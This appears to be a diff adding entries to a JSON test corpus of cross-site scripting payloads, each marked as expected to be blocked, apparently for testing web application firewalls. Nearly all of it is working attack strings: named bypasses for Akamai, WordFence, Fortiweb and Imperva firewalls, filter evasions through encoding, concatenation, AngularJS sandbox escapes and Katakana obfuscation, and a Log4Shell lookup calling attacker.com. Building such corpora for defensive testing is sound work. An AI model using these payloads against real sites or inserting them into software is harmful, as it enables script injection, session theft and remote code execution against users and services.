+      "payload": "<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>",
+      "tags": ["waf-bypass", "akamai", "newline-mixed"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Akamai WAF bypass via mixed case and newlines",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-226",
+      "payload": "<a href=javas&#99;ript:alert(1)>",
+      "tags": ["waf-bypass", "wordfence", "encoded-js"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "WordFence WAF bypass via encoded javascript",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-227",
+      "payload": "\\u003e\\u003c\\u0068\\u0031 onclick=alert('1')\\u003e",
+      "tags": ["waf-bypass", "fortiweb", "unicode-escape"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Fortiweb WAF bypass via Unicode escapes",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-228",
+      "payload": "<script>onerror=alert;throw 1337</script>",
+      "tags": ["filter-bypass", "no-parenthesis", "throw"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Parenthesis bypass via onerror throw",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-229",
+      "payload": "<script>{onerror=alert}throw 1337</script>",
+      "tags": ["filter-bypass", "no-parenthesis", "block"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Parenthesis bypass via block statement",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-230",
+      "payload": "<script>throw onerror=alert,'some string',123,'haha'</script>",
+      "tags": ["filter-bypass", "no-parenthesis", "comma-throw"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Parenthesis bypass via comma operator throw",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-231",
+      "payload": "<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>",
+      "tags": ["filter-bypass", "no-parenthesis", "regex-throw"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Advanced parenthesis bypass via regex throw",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-232",
+      "payload": "<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>",
+      "tags": ["filter-bypass", "no-parenthesis", "prototype"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Parenthesis bypass via TypeError prototype",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-233",
+      "payload": "<script x>alert('XSS')<script y>",
+      "tags": ["filter-bypass", "tag-bypass", "malformed"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Tag blacklist bypass via attributes",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-234",
+      "payload": "eval('ale'+'rt(0)');",
+      "tags": ["filter-bypass", "word-blacklist", "concat"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Word blacklist bypass via string concatenation",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-235",
+      "payload": "Function(\"ale\"+\"rt(1)\")();",
+      "tags": ["filter-bypass", "word-blacklist", "function-constructor"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Word blacklist bypass via Function constructor",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-236",
+      "payload": "new Function`al\\ert\\`6\\``;",
+      "tags": ["filter-bypass", "word-blacklist", "template-literal"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Word blacklist bypass via template literal escape",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-237",
+      "payload": "setTimeout('ale'+'rt(2)');",
+      "tags": ["filter-bypass", "word-blacklist", "settimeout"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Word blacklist bypass via setTimeout concat",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-238",
+      "payload": "setInterval('ale'+'rt(10)');",
+      "tags": ["filter-bypass", "word-blacklist", "setinterval"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Word blacklist bypass via setInterval concat",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-239",
+      "payload": "Set.constructor('ale'+'rt(13)')();",
+      "tags": ["filter-bypass", "word-blacklist", "set-constructor"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Word blacklist bypass via Set.constructor",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-240",
+      "payload": "Set.constructor`al\\x65rt\\x2814\\x29``;",
+      "tags": ["filter-bypass", "word-blacklist", "hex-template"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Word blacklist bypass via hex template literal",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-241",
+      "payload": "{{x=['constr', 'uctor'];a=x.join('');b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'pr\\u{6f}mpt(d\\u{6f}cument.d\\u{6f}main)')()}}",
+      "tags": ["waf-bypass", "imperva", "angular"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Imperva WAF bypass via AngularJS constructor split",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-242",
+      "payload": "{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}",
+      "tags": ["waf-bypass", "angular", "fromcharcode"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "AngularJS no-quote bypass via fromCharCode",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-243",
+      "payload": "{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}",
+      "tags": ["waf-bypass", "angular", "toString36"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "AngularJS no-quote bypass via toString(36)",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-244",
+      "payload": "%26%2397;lert(1)",
+      "tags": ["filter-bypass", "html-encoding", "double-entity"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "HTML double-entity encoding bypass",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-245",
+      "payload": "></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>",
+      "tags": ["filter-bypass", "html-encoding", "entity-function"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "HTML entity encoded function bypass",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-246",
+      "payload": "javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()",
+      "tags": ["filter-bypass", "katakana", "obfuscation"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Filter bypass via Katakana obfuscation",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-247",
+      "payload": "<sCrIpt>alert(1)</ScRipt>",
+      "tags": ["filter-bypass", "case-sensitivity", "mixed-case"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Case-sensitive filter bypass via mixed case",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-248",
+      "payload": "<ScrIPt>alert(1)</ScRipT>",
+      "tags": ["filter-bypass", "case-sensitivity", "alternating"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Case-sensitive bypass via alternating case",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-249",
+      "payload": "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}",
+      "tags": ["waf-bypass", "log4j", "jndi"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Log4Shell WAF bypass via env variable substitution",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-250",
+      "payload": "<html onMouseUp html onMouseUp=\"javascript:javascript:alert(1)\"></html onMouseUp>",
+      "tags": ["filter-bypass", "event-handler", "duplicate-attr"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Filter bypass via duplicate event attributes",
+      "category": "XSS"
+  }
+]
